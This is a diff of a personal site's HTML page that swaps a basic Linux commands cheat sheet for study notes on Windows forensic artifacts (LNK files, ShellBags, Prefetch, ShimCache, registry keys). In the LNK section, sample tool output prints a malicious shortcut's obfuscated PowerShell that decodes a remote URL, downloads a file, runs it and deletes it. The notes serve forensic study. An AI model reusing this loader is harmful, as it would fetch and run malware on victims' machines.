@@ -1,47 +1,122 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Linux Commands Cheat Sheet - thrwt</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows Artifacts - thrwt</title>
+                     <link rel="icon" type="image/x-icon" href="images/favicon.ico">
     <link rel="stylesheet" href="../css/style.css">
+                    <script src="../js/main.js"></script>
+
+    <style>
+        .post h2 {
+            margin-top: 36px;
+            margin-bottom: 12px;
+        }
+        .post h3 {
+            margin-top: 28px;
+            margin-bottom: 10px;
+        }
+        .post h4 {
+            margin-top: 20px;
+            margin-bottom: 8px;
+        }
+        .post ul, .post ol {
+            margin-left: 22px;
+            margin-bottom: 14px;
+        }
+        .post li {
+            margin-bottom: 6px;
+        }
+        .post code {
+            background: rgba(138, 180, 248, 0.12);
+            color: #8ab4f8;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: "Courier New", monospace;
+            font-size: 0.92em;
+            word-break: break-word;
+        }
+        .post pre {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(138, 180, 248, 0.25);
+            border-radius: 8px;
+            padding: 14px 16px;
+            overflow-x: auto;
+            margin-bottom: 16px;
+        }
+        .post pre code {
+            background: none;
+            padding: 0;
+            color: #d6e3ff;
+        }
+        .post table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 18px;
+        }
+        .post table th, .post table td {
+            border: 1px solid rgba(138, 180, 248, 0.25);
+            padding: 8px 12px;
+            text-align: left;
+        }
+        .post table th {
+            background: rgba(138, 180, 248, 0.12);
+            color: #8ab4f8;
+        }
+        .post hr {
+            border: none;
+            border-top: 1px solid rgba(138, 180, 248, 0.2);
+            margin: 28px 0;
+        }
+        .note-box {
+            background: rgba(138, 180, 248, 0.08);
+            border-left: 3px solid #8ab4f8;
+            padding: 12px 16px;
+            border-radius: 6px;
+            margin-bottom: 16px;
+        }
+        .post a {
+            color: #8ab4f8;
+            word-break: break-word;
+        }
+    </style>
 </head>
 <body>
 <div class="navbar">
     <div class="logo"><a href="../index.html">THRWT</a></div>
     <div>
         <a href="../index.html">Home</a>
-        <a href="../Notes.html">Notes</a>
         <a href="../about.html">About</a>
     </div>
 </div>
-
 <div class="container">
     <!-- LEFT SIDEBAR -->
     <div class="sidebar">
         <img src="../images/Image .jpg" alt="Profile">
-        <h2>Mohamed Tharwat</h2>
-        <p>small bio about</p>
+        <h2>thrwt</h2>
+        <p>OMG</p>
         <div class="icons">
-            <a href="#"><ion-icon name="logo-facebook"></ion-icon></a>
-            <a href="#"><ion-icon name="logo-linkedin"></ion-icon></a>
-            <a href="#"><ion-icon name="logo-medium"></ion-icon></a>
+            <a href="https://www.linkedin.com/in/mohamed-tharwat1/"><ion-icon name="logo-linkedin"></ion-icon></a>
+            <a href="https://medium.com/@mohamedtharwat_67874"><ion-icon name="logo-medium"></ion-icon></a>
+            <a href="https://discord.com/users/1210726491088887838"><ion-icon name="logo-discord"></ion-icon></a>
         </div>
     </div>
-
-    <!-- MAIN CONTENT - بدون Categories -->
+    <!-- MAIN CONTENT -->
     <div class="content">
         <div class="post">
-            <h1>Essential Linux Commands Cheat Sheet</h1>
-            
+            <h1>Windows Artifacts</h1>
+
             <!-- Meta Info -->
             <div class="post-meta" style="margin-bottom: 20px;">
                 <div class="post-meta-item">
                     <ion-icon name="calendar-outline"></ion-icon>
-                    <span>Dec 05, 2025</span>
+                    <span>Jun 20, 2026</span>
                 </div>
                 <div class="post-meta-item">
                     <ion-icon name="time-outline"></ion-icon>
-                    <span>3 min read</span>
+                    <span class="reading-time">Calculating...</span>
                 </div>
+
                 <div class="post-meta-item">
                     <ion-icon name="bookmark-outline"></ion-icon>
                     <span>Study Notes</span>
@@ -49,134 +124,1181 @@
             </div>
 
             <!-- صورة رئيسية -->
-            <img src="../images/writeup1.jpg" class="writeup-image" alt="Linux Commands">
+            <img src="../images/writeup1.jpg" class="writeup-image" alt="Windows Forensics">
 
-            <!-- المحتوى -->
-            <h2>File Operations</h2>
-            <p>Essential commands for working with files and directories:</p>
-            
-            <h3>Listing Files</h3>
-            <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #00ff00;">
-# List files in current directory
-ls
-
-# List with details
-ls -la
-
-# List sorted by modification time
-ls -lt
-            </pre>
-
-            <h3>File Manipulation</h3>
-            <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #00ff00;">
-# Copy file
-cp source.txt destination.txt
-
-# Move/rename file
-mv oldname.txt newname.txt
-
-# Delete file
-rm file.txt
-
-# Delete directory recursively
-rm -rf directory/
-            </pre>
-
-            <h2>Text Processing</h2>
-            <p>Commands for searching and manipulating text:</p>
-            
-            <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #00ff00;">
-# Search for pattern in file
-grep "pattern" file.txt
-
-# Search recursively in directory
-grep -r "pattern" /path/
-
-# Count lines in file
-wc -l file.txt
-
-# Display first 10 lines
-head file.txt
-
-# Display last 10 lines
-tail file.txt
-
-# Follow file updates in real-time
-tail -f logfile.log
-            </pre>
-
-            <h2>Network Commands</h2>
-            <p>Useful networking commands for security testing:</p>
-            
-            <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #00ff00;">
-# Check network connectivity
-ping 8.8.8.8
-
-# Show network interfaces
-ifconfig
-# or
-ip addr show
-
-# Display routing table
-route -n
-# or
-ip route
-
-# Check open ports
-netstat -tulpn
-
-# DNS lookup
-nslookup domain.com
-dig domain.com
-            </pre>
-
-            <h2>User & Permissions</h2>
-            <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #00ff00;">
-# Change file permissions
-chmod 755 file.sh
-
-# Change file owner
-chown user:group file.txt
-
-# Switch user
-su - username
-
-# Run command as root
-sudo command
-
-# Add user to group
-usermod -aG groupname username
-            </pre>
-
-            <h2>Process Management</h2>
-            <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #00ff00;">
-# List running processes
-ps aux
-
-# Display processes tree
-pstree
-
-# Kill process by PID
-kill 1234
-
-# Kill process by name
-pkill process_name
-
-# Monitor system resources
-top
-# or
-htop
-            </pre>
-
-            <h2>Quick Tips</h2>
+            <h2>Artifacts</h2>
+            <p><strong>Digital Forensic Artifacts</strong> on a <strong>Windows system</strong> can be classified into two categories</p>
             <ul>
-                <li>Use <code>man command</code> to read manual pages</li>
-                <li>Press <code>Tab</code> for auto-completion</li>
-                <li>Use <code>history</code> to view previous commands</li>
-                <li><code>Ctrl + R</code> to search command history</li>
-                <li><code>Ctrl + C</code> to cancel running command</li>
-                <li><code>Ctrl + Z</code> to suspend process</li>
+                <li><strong>System Artifacts:</strong> These are related to system activities (e.g., system logs, event logs, registry changes)</li>
+                <li><strong>User Artifacts:</strong> These are related to <strong>user activity</strong>, such as files a user has accessed, browser history, and recent documents.</li>
             </ul>
+
+            <hr>
+
+            <h2>.lnk File (important)</h2>
+            <p><code>.lnk</code> files (shortcut files) in Windows contain metadata that links to another file or application. They store information like the target file's location, making it easier to access frequently used files.</p>
+
+            <h3>LNK Files – Metadata and Signature</h3>
+            <ul>
+                <li><code>.lnk</code> files are metadata files interpreted by the Windows Shell.</li>
+                <li>They have a unique file signature (0x4C or "4C 00 00 00"), which can be used for forensic analysis or recovery.</li>
+            </ul>
+
+            <h3>Metadata Found in .lnk Files</h3>
+            <ul>
+                <li>File path of the target.</li>
+                <li>MAC address of the host computer (sometimes).</li>
+                <li>Last accessed size of the target file.</li>
+                <li>Volume serial number where the target file was stored.</li>
+                <li>Network share name (if applicable).</li>
+                <li>File attributes (read-only, hidden, encrypted, etc.).</li>
+                <li>Distributed link tracking information.</li>
+            </ul>
+
+            <h3>Common Locations of .lnk Files</h3>
+            <ul>
+                <li><code>%USERPROFILE%\Recent</code> (Recent Documents folder).</li>
+                <li><code>%USERPROFILE%\Application Data\Microsoft\Office\Recent</code> (for MS Office shortcuts).</li>
+            </ul>
+
+            <h3>.lnk File Time Stamps</h3>
+            <ul>
+                <li><code>.lnk</code> files store their own <strong>MAC (Modified, Accessed, Created) timestamps</strong>.</li>
+                <li>When a target file is opened, its timestamps are copied into the <code>.lnk</code> file.</li>
+                <li>Windows uses an 8-byte <code>FILETIME</code> format to store timestamps.</li>
+            </ul>
+
+            <h3>Filesystem Timestamps in .lnk Files</h3>
+            <ul>
+                <li>The creation timestamp of a <code>.lnk</code> file shows the first time the target file was accessed.</li>
+                <li>The modification timestamp indicates the last time it was opened.</li>
+            </ul>
+
+            <h3>Identical Timestamps – Meaning</h3>
+            <ul>
+                <li>If the timestamps of the <code>.lnk</code> file and the file system match, it means the target file was accessed only once from the shortcut.</li>
+            </ul>
+
+            <h3>No Embedded Dates in Certain Cases</h3>
+            <ul>
+                <li>Some <code>.lnk</code> files don't store timestamps, especially if they were created when saving a new file.</li>
+            </ul>
+
+            <h3>Microsoft Office Behavior</h3>
+            <ul>
+                <li>When an Office file is saved for the first time, two <code>.lnk</code> files may be created:
+                    <ul>
+                        <li>One in the "Recent" folder (without embedded dates).</li>
+                        <li>One in the "Office Recent" folder (with embedded dates).</li>
+                    </ul>
+                </li>
+            </ul>
+
+            <h3>Security Risks of LNK Files</h3>
+            <p>Never <strong>underestimate</strong> an <strong>LNK</strong> file! It can be configured to <strong>execute malicious commands</strong> when opened, making it a common method for spreading malware.</p>
+
+            <h3>LECmd.exe (by Eric Zimmerman)</h3>
+            <p><strong>Basic Usage (Analyzing a Single File)</strong></p>
+            <pre><code>C:\forensics tool\LECmd&gt; .\LECmd.exe -f "C:\evidence\picture.lnk"</code></pre>
+
+            <p><strong>Generating Reports in Different Formats</strong></p>
+            <pre><code>LECmd.exe -d "C:\evidence\" --csv "C:\evidence" --html "C:\evidence" --xml "C:\evidence\xml" -q</code></pre>
+            <ul>
+                <li><code>-d</code>: Analyze all LNK files in a specified folder.</li>
+                <li><code>-csv --html --xml</code>: Export results in multiple formats.</li>
+                <li><code>-q</code>: Run in <strong>silent mode</strong> (no on-screen messages).</li>
+            </ul>
+
+            <p>This output of executing this command:</p>
+            <pre><code>File size (bytes): 0</code></pre>
+            <p>⮕ This could indicate that the shortcut is just a reference and doesn't contain embedded data.</p>
+
+            <pre><code>Flags: HasTargetIdList, HasRelativePath, HasArguments, HasIconLocation, IsUnicode, HasExpIcon</code></pre>
+            <ul>
+                <li><code>HasTargetIdList</code>: Indicates the shortcut references an object (file, folder, etc.).</li>
+                <li><code>HasRelativePath</code>: Uses a relative file path instead of an absolute one.</li>
+                <li><code>HasArguments</code>: Contains command-line arguments (important for execution).</li>
+                <li><code>HasIconLocation</code>: Uses a specific icon file.</li>
+                <li><code>IsUnicode</code>: Uses Unicode encoding.</li>
+                <li><code>HasExpIcon</code>: Contains an expanded icon reference</li>
+            </ul>
+
+            <pre><code>File attributes: 0
+Icon index: 67
+Show window: SwShowminnoactive (Display the window as minimized without activating it.)</code></pre>
+
+            <pre><code>Relative Path: ..\..\..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</code></pre>
+
+            <pre><code>Arguments: -ExecutionPolicy UnRestricted $ProgressPreference = 0;
+function nvRClWiAJT($OnUPXhNfGyEh){$OnUPXhNfGyEh[$OnUPXhNfGyEh.Length..0] -join('')};
+function sDjLksFILdkrdR($OnUPXhNfGyEh){
+$vecsWHuXBHu = nvRClWiAJT $OnUPXhNfGyEh;
+for($TJuYrHOorcZu = 0;$TJuYrHOorcZu -lt $vecsWHuXBHu.Length;$TJuYrHOorcZu += 2){
+try{$zRavFAQNJqOVxb += nvRClWiAJT $vecsWHuXBHu.Substring($TJuYrHOorcZu,2)}
+catch{$zRavFAQNJqOVxb += $vecsWHuXBHu.Substring($TJuYrHOorcZu,1)}};$zRavFAQNJqOVxb};
+$NpzibtULgyi = sDjLksFILdkrdR 'aht1.sen/hi/coucys.erstmaofershma//s:tpht';
+$cDkdhkGBtl = $env:APPDATA + '\' + ($NpzibtULgyi -split '/')[-1];
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+$wbpiCTsGYi = wget $NpzibtULgyi -UseBasicParsing;
+[IO.File]::WriteAllText($cDkdhkGBtl, $wbpiCTsGYi);
+&amp; $cDkdhkGBtl;
+sleep 3;
+rm $cDkdhkGBtl;
+Icon Location: C:\Windows\System32\imageres.dll</code></pre>
+
+            <p><code>-- Target ID information (Format: Type ==&gt; Value) ---</code></p>
+            <pre><code>Absolute path: This PC\C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</code></pre>
+
+            <hr>
+
+            <h2>ThumbCache / Windows Icon</h2>
+            <ul>
+                <li>Thumbnail creation: These thumbnails are created when a user views or interacts with a directory containing media files.</li>
+                <li>Thumbnails remain cached even if the original file is deleted, allowing analysts to identify deleted content.</li>
+                <li>Metadata within thumb cache files can include original file paths, helping determine where a file was accessed.</li>
+                <li>Cached thumbnails can reveal what a user has viewed, even if it is later deleted, moved or hidden.</li>
+            </ul>
+            <p>Locate the files: <code>%USERPROFILE%\AppData\Local\Microsoft\Windows\Explorer</code></p>
+
+            <p><strong>TOOL:</strong> Thumbcache Viewer</p>
+
+            <h3>Mapping the Image</h3>
+            <ul>
+                <li>There is a method to map images using the <strong>Extensible Storage Engine (ESE)</strong></li>
+                <li>The database file used is called <strong>Windows.edb</strong>, which contains indexed data from the system.</li>
+            </ul>
+            <p>Stored in <code>C:\ProgramData\Microsoft\Search\Data\Applications\Windows</code></p>
+
+            <hr>
+
+            <h2>ShellBags</h2>
+            <ul>
+                <li>Shellbags are Windows registry artifacts that log user interactions with folders even after those folders are deleted.</li>
+                <li>They contain timestamps and metadata that help reconstruct user activity timelines.</li>
+                <li>These registry keys record metadata such as folder paths, view settings and timestamps</li>
+            </ul>
+
+            <h3>Where Are ShellBags Stored?</h3>
+            <p><strong>User-Specific Shellbags</strong></p>
+            <ul>
+                <li><code>HKEY_USERS\&lt;SID&gt;\Software\Microsoft\Windows\Shell\BagMRU</code></li>
+                <li><code>HKEY_USERS\&lt;SID&gt;\Software\Microsoft\Windows\Shell\Bags</code></li>
+            </ul>
+
+            <p><strong>Current User Shellbags</strong></p>
+            <ul>
+                <li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\BagMRU</code></li>
+                <li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Bags</code></li>
+            </ul>
+
+            <p><strong>Supporting Files</strong></p>
+            <p>Shellbag data is also found inside user registry hive files:</p>
+            <ul>
+                <li><code>NTUSER.DAT</code>: Located at <code>C:\Users\&lt;Username&gt;\NTUSER.DAT</code></li>
+                <li><code>USRCLASS.DAT</code>: Located at <code>C:\Users\&lt;Username&gt;\AppData\Local\Microsoft\Windows</code></li>
+            </ul>
+
+            <p><strong>Tool:</strong> ShellBags Explorer – Extracts and analyzes folder history.</p>
+
+            <hr>
+
+            <h2>Volume Shadow Copy Service - VSS</h2>
+            <h3>VSC (Volume Shadow Copy)</h3>
+            <p>A set of COM APIs that implements a framework to allow volume backups to be performed</p>
+
+            <h3>Mechanism</h3>
+            <ol>
+                <li>VSC tracks changes to blocks of data on the disk rather than logical files in their entirety</li>
+                <li>When you mount the VSC, it will appear as a mirror of the whole contents of the volume that was monitored.</li>
+            </ol>
+
+            <h3>Storage Limitation</h3>
+            <ul>
+                <li>Windows <strong>automatically manages</strong> snapshots, deleting older ones when storage is full.</li>
+                <li>Windows limits the maximum disk space consumed by VSC snapshots is 5% of the volume size.</li>
+            </ul>
+
+            <h3>Snapshot Creation Triggers</h3>
+            <ul>
+                <li>Created <strong>automatically</strong> during updates, driver installations, scheduled tasks, or manually.</li>
+            </ul>
+
+            <h3>Forensic Value</h3>
+            <ul>
+                <li>Helps recover <strong>deleted files, registry keys, logs, and tampered data</strong> for investigation.</li>
+            </ul>
+
+            <h3>Tools for Accessing VSC</h3>
+            <ul>
+                <li><strong>Vssadmin + mklink</strong> (Windows built-in tool)</li>
+                <li><strong>ShadowCopyView, Shadow Explorer</strong> (GUI tools)</li>
+                <li><strong>Libvshadow, VSC Toolset</strong> (Forensic tools)</li>
+            </ul>
+
+            <h3>File History (Windows 8+)</h3>
+            <ul>
+                <li>Backs up user data (Libraries, Desktop, Contacts, etc.) <strong>hourly</strong>.</li>
+                <li>Uses <strong>5% of disk space</strong> for offline caching and retains backups indefinitely.</li>
+                <li>Stores cached files in: <code>%USERPROFILE%\AppData\Local\Microsoft\Windows\FileHistory\Data</code></li>
+            </ul>
+
+            <h3>Forensic Insights from File History</h3>
+            <ul>
+                <li>Backup directories, user ID, PC name, retention policy, storage location</li>
+            </ul>
+
+            <hr>
+
+            <h2>JumpLists</h2>
+            <p>Jumplists are available on all taskbar icons for applications. Their purpose is to allow easy access to common tasks for the given application.</p>
+
+            <h3>Location</h3>
+            <ol>
+                <li><code>C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations</code></li>
+                <li><code>C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations</code></li>
+            </ol>
+
+            <p><strong>AutomaticDestinations</strong>: are created by the operating system.</p>
+            <p><strong>CustomDestinations</strong>: are created when a user pins a file to an application via taskbar.</p>
+
+            <p>The details of applications that have been pinned to the taskbar are also recorded in registry values <code>Favorites</code>, <code>FavoritesResolve</code> in:</p>
+            <pre><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband</code></pre>
+
+            <p>There are other locations needed to be checked such as:</p>
+            <ol>
+                <li><code>C:\Users\%USERNAME%\AppData\Roaming\Microsoft\InternetExplorer\Quick Launch\User Pinned\TaskBar</code></li>
+            </ol>
+
+            <hr>
+
+            <h2>Windows Search History</h2>
+            <p>A search index allows users to quickly search for data and files in the file system due to indexing of files</p>
+
+            <p><strong>Forensic Value</strong></p>
+            <p>Knowing the time and the date when a user searched for a specific keyword on the machine.</p>
+            <p>All searches are saved in the Windows.edb file.</p>
+
+            <p><strong>Location:</strong> <code>%ProgramData%\Microsoft\Search\Data\Applications\Windows</code></p>
+            <p><strong>Tools:</strong> Win Search DB Analyzer</p>
+
+            <hr>
+
+            <h2>Windows Recycle Bin</h2>
+            <h3>Older Windows Versions (Before Vista)</h3>
+            <p>Deleted files were renamed using the format: <strong>C&lt;DriveLetter&gt;&lt;Index#&gt;.&lt;FileExtension&gt;</strong> (e.g., DC2.exe).</p>
+            <p>Metadata was stored in the <strong>INFO2</strong> file, containing:</p>
+            <ul>
+                <li>Original filename &amp; path</li>
+                <li>File size</li>
+                <li>Deletion date/time</li>
+            </ul>
+
+            <h3>Newer Versions of Windows</h3>
+            <p>Starting from <strong>Windows Vista</strong>, the structure changed. Instead of a single INFO2 file, Windows now creates <strong>two separate files</strong> for each deleted file in the <code>$Recycle.Bin</code> directory:</p>
+            <ol>
+                <li><strong>$I&lt;ID_String&gt;.&lt;extension&gt;</strong> → Metadata file
+                    <ul>
+                        <li>Stores information such as: Original file path, original filename, file size, date and time of deletion.</li>
+                    </ul>
+                </li>
+                <li><strong>$R&lt;ID_String&gt;.&lt;extension&gt;</strong> → Raw file content
+                    <ul>
+                        <li>Contains the actual deleted file's data.</li>
+                    </ul>
+                </li>
+            </ol>
+            <p>These files are named using a unique <strong>ID string</strong> to prevent conflicts.</p>
+
+            <h3>Tools for Analyzing $Recycle.Bin</h3>
+            <p><strong>1. Rifiuti &amp; Rifiuti-Vista</strong></p>
+            <ul>
+                <li>Used to parse and analyze <code>$I</code> files (metadata files).</li>
+                <li>Command to analyze <code>$Recycle.Bin</code> metadata:</li>
+            </ul>
+            <pre><code>.\rifiuti-vista.exe -x -z "C:\$Recycle.Bin\S-1-5-21-3459457667-847189511-749124871-1001\"</code></pre>
+            <ul>
+                <li><code>-x</code> → Outputs XML format.</li>
+                <li><code>-z</code> → Enables timezone conversion.</li>
+            </ul>
+
+            <p><strong>2. $I_Parse (GUI Tool)</strong></p>
+            <ul>
+                <li>A graphical tool for extracting metadata from <code>$I</code> files.</li>
+                <li>Displays original filename, path, deletion date, and size</li>
+            </ul>
+            <div class="note-box">
+                <strong>NOTE:</strong> the last digits in the ID are the same digits in the ID users — you can check it in the registry.
+            </div>
+
+            <hr>
+
+            <h2>Prefetch Files (evidence of execution)</h2>
+            <p><strong>Prefetch files</strong> (<code>.pf</code>) are small files automatically created by Windows <strong>when an executable file is run</strong>. Their main purpose is to help Windows launch programs faster.</p>
+
+            <p>Windows uses them to <strong>speed up application launching</strong> by tracking:</p>
+            <ul>
+                <li>The first time the program ran.</li>
+                <li>The last 8 times it ran.</li>
+                <li>Files and DLLs it accessed</li>
+            </ul>
+
+            <h3>Mechanism</h3>
+            <ul>
+                <li><strong>Windows Cache Manager</strong> tracks:
+                    <ul>
+                        <li><strong>First 2 minutes</strong> of system boot.</li>
+                        <li><strong>First 10 seconds</strong> of application startup.</li>
+                    </ul>
+                </li>
+                <li>The data is stored in <strong>.PF (Prefetch) files</strong> under <code>C:\Windows\Prefetch</code>.</li>
+            </ul>
+
+            <h3>Prefetch File Contents</h3>
+            <p>Each <strong>.PF file</strong> contains:</p>
+            <ol>
+                <li><strong>Executable name</strong></li>
+                <li><strong>Absolute path</strong> to the executable</li>
+                <li><strong>Number of times</strong> the program has run</li>
+                <li><strong>Last execution timestamp</strong></li>
+                <li><strong>List of DLLs</strong> used by the program</li>
+            </ol>
+
+            <h3>Registry Settings (Enable/Disable Prefetching)</h3>
+            <p>If <strong>no prefetch files</strong> exist, check:</p>
+            <pre><code>HKLM\SYSTEM\CurrentControlSet\Control\SessionManager\MemoryManagement\PrefetchParameters</code></pre>
+            <ul>
+                <li><code>0</code> → <strong>Disabled</strong> (No prefetching)</li>
+                <li><code>1</code> → <strong>Application Prefetching Only</strong></li>
+                <li><code>2</code> → <strong>Boot Prefetching Only</strong></li>
+                <li><code>3</code> → <strong>Both Application &amp; Boot Prefetching</strong></li>
+            </ul>
+
+            <h3>Tool for Prefetch Analysis</h3>
+            <ul>
+                <li><strong>PECmd (Prefetch Explorer Command-line Tool)</strong>
+                    <ul>
+                        <li>Extracts and analyzes prefetch files.</li>
+                        <li>Example command:</li>
+                    </ul>
+                </li>
+            </ul>
+            <pre><code>PECmd.exe -d "D:\0x\The-Hood\prefetch" --csv D:\ --csvf pf.csv</code></pre>
+
+            <hr>
+
+            <h2>Program Compatibility Assistant (important for execution)</h2>
+            <p>A Windows feature that monitors applications for issues like crashes, compatibility problems, or suspicious behavior.</p>
+
+            <hr>
+
+            <h2>Microsoft Protection Log (MPLog)</h2>
+            <p><strong>MPLog</strong> stands for Microsoft Protection Log, a plain-text log generated by Windows Defender</p>
+            <ul>
+                <li><strong>Process execution tracking</strong> – they can show which processes ran and when</li>
+                <li><strong>Detection events</strong> – logs include records of threats detected, such as malware signatures, file paths, process IDs</li>
+            </ul>
+            <p><code>C:\ProgramData\Microsoft\Windows Defender\Support\</code></p>
+
+            <hr>
+
+            <h2>ShimCache (Application Compatibility Cache) <code>AppCompatCache</code></h2>
+            <ul>
+                <li>ShimCache helps Windows track applications that need <strong>compatibility settings</strong> to run properly on newer versions of Windows.</li>
+                <li>It provides <strong>backward compatibility</strong> for older software.</li>
+            </ul>
+
+            <h3>Forensic Value</h3>
+            <p>ShimCache stores:</p>
+            <ol>
+                <li><strong>Executable/script file names &amp; full paths</strong></li>
+                <li><strong>Whether the file actually ran or was just viewed in Explorer</strong></li>
+                <li><strong>Last modified timestamp</strong> (Standard Information Last Modified Date)</li>
+                <li><strong>Size of the binary file</strong></li>
+            </ol>
+
+            <div class="note-box">
+                💡 <strong>Important:</strong> Even if an executable <strong>isn't run</strong>, just <strong>browsing</strong> through Windows Explorer will cause it to be logged in ShimCache. If more executables appear after resizing the Explorer window, they will also be shimmed but only saved after a <strong>reboot or shutdown</strong>.
+            </div>
+
+            <h3>Locations</h3>
+            <ol>
+                <li><strong>Registry Key:</strong>
+                    <pre><code>HKLM\SYSTEM\CurrentControlSet\Control\SessionManager\AppCompatCache\AppCompatCache</code></pre>
+                </li>
+                <li><strong>SYSTEM Hive File:</strong>
+                    <pre><code>C:\Windows\System32\Config\SYSTEM</code></pre>
+                </li>
+            </ol>
+
+            <h3>Tool for Analysis</h3>
+            <ul>
+                <li><strong>AmcacheParser</strong> (Parses and extracts useful forensic data from ShimCache).</li>
+                <li>AppCompatParser</li>
+            </ul>
+
+            <hr>
+
+            <h2>Windows Registry</h2>
+            <p><a href="https://medium.com/@araman99/uncovering-windows-forensics-artefacts-for-digital-forensics-investigators-e0b75f01d086" target="_blank">Reference: Uncovering Windows Forensics Artefacts for Digital Forensics Investigators</a></p>
+
+            <h3>1. User Activity</h3>
+
+            <h4>🔸 RecentDocs (NTUSER.DAT)</h4>
+            <ul>
+                <li>Location: <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs</code></li>
+                <li>Tracks most recently accessed files by extension and path.</li>
+                <li>Forensics value: Shows what documents were accessed and when.</li>
+            </ul>
+
+            <h4>🔸 TypedURLs / TypedPaths</h4>
+            <ul>
+                <li>Location:
+                    <ul>
+                        <li>URLs: <code>HKCU\Software\Microsoft\Internet Explorer\TypedURLs</code></li>
+                        <li>Paths: <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths</code></li>
+                    </ul>
+                </li>
+                <li>Shows manual inputs in the address bar (web or folder).</li>
+                <li>Forensics value: Can reveal intentional user navigation to sensitive locations or websites.</li>
+            </ul>
+
+            <h4>🔸 UserAssist</h4>
+            <ul>
+                <li>Location: <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist</code></li>
+                <li>Tracks programs executed by the user.</li>
+                <li>Values are ROT13-encoded (e.g., <code>HRZR_EHACngU</code> = <code>UEM_RUNPath</code>).</li>
+                <li>Forensics value: Precise insight into what the user launched, including timestamps (last execution time).</li>
+            </ul>
+
+            <h4>🔸 ShellBags</h4>
+            <ul>
+                <li>Location: Stored in <code>NTUSER.DAT</code> and <code>UsrClass.dat</code></li>
+                <li>Tracks folder views, including deleted folders and network shares.</li>
+                <li>Forensics value: Shows access to paths no longer present, useful for identifying hidden or removed folders.</li>
+            </ul>
+
+            <hr>
+
+            <h3>🖥️ 2. System Configuration &amp; Timeline</h3>
+
+            <h4>🔸 System Boot and Shutdown</h4>
+            <ul>
+                <li>Keys like <code>HKLM\SYSTEM\ControlSet001\Control\Windows</code> → <code>ShutdownTime</code> (FILETIME format).</li>
+                <li>LastBootUpTime can be pulled from Event Logs or registry volatility plugins.</li>
+                <li>Forensics value: Timeline anchoring (helps sequence events before/after reboots).</li>
+            </ul>
+
+            <h4>🔸 MountedDevices</h4>
+            <ul>
+                <li>Location: <code>HKLM\SYSTEM\MountedDevices</code></li>
+                <li>Shows drive letters and corresponding device GUIDs or serials.</li>
+                <li>Forensics value: Detects previously connected USBs or external drives even if they're not currently attached.</li>
+            </ul>
+
+            <h4>🔸 Time Zone Settings</h4>
+            <ul>
+                <li>Location: <code>HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation</code></li>
+                <li>Forensics value: Ensures accurate timeline interpretation—important for correlating with logs and timestamps.</li>
+            </ul>
+
+            <h4>🔸 Network Interfaces</h4>
+            <ul>
+                <li>Location: <code>HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces</code></li>
+                <li>IP addresses, DHCP lease times, etc.</li>
+                <li>Forensics value: Determines past network connections and configurations.</li>
+            </ul>
+
+            <hr>
+
+            <h3>🧑‍💻 3. User Accounts</h3>
+
+            <h4>🔸 SAM Hive</h4>
+            <ul>
+                <li>Location: <code>C:\Windows\System32\config\SAM</code></li>
+                <li>Contains user account names, RIDs, and password hash references.</li>
+                <li>Forensics value: User enumeration, privilege level tracking.</li>
+            </ul>
+
+            <h4>🔸 NTUSER.DAT</h4>
+            <ul>
+                <li>Per-user hive found in <code>C:\Users\[username]\</code></li>
+                <li>Holds user-specific settings, app history, typed commands, etc.</li>
+                <li>Forensics value: User attribution, activity, and persistence mechanisms.</li>
+            </ul>
+
+            <h4>🔸 ProfileList</h4>
+            <ul>
+                <li>Location: <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList</code></li>
+                <li>Links SID to profile path and LastUseTime.</li>
+                <li>Forensics value: Confirms presence of users and last interaction.</li>
+            </ul>
+
+            <hr>
+
+            <h3>🧬 4. Malware and Persistence</h3>
+
+            <h4>🔸 Run / RunOnce Keys</h4>
+            <ul>
+                <li>Locations:
+                    <ul>
+                        <li><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
+                        <li><code>HKLM\SYSTEM\CurrentControlSet\Services\...</code></li>
+                    </ul>
+                </li>
+                <li>Commonly abused to maintain persistence across reboots.</li>
+                <li>Forensics value: Detects automatic execution of malware or suspicious scripts.</li>
+            </ul>
+
+            <h4>🔸 AppInit_DLLs</h4>
+            <ul>
+                <li>Location: <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows</code></li>
+                <li>Allows DLLs to be loaded into every user-mode process.</li>
+                <li>Forensics value: High stealth method for persistence.</li>
+            </ul>
+
+            <h4>🔸 Services</h4>
+            <ul>
+                <li>Location: <code>HKLM\SYSTEM\CurrentControlSet\Services</code></li>
+                <li>Malware may install itself as a service to start with the system.</li>
+                <li>Forensics value: Look for non-default services or odd paths.</li>
+            </ul>
+
+            <h4>🔸 ShimCache (AppCompatCache)</h4>
+            <ul>
+                <li>Location: <code>HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache</code></li>
+                <li>Stores metadata of executed programs, even if deleted.</li>
+                <li>Forensics value: Proof of execution even without Prefetch or logs.</li>
+            </ul>
+
+            <hr>
+
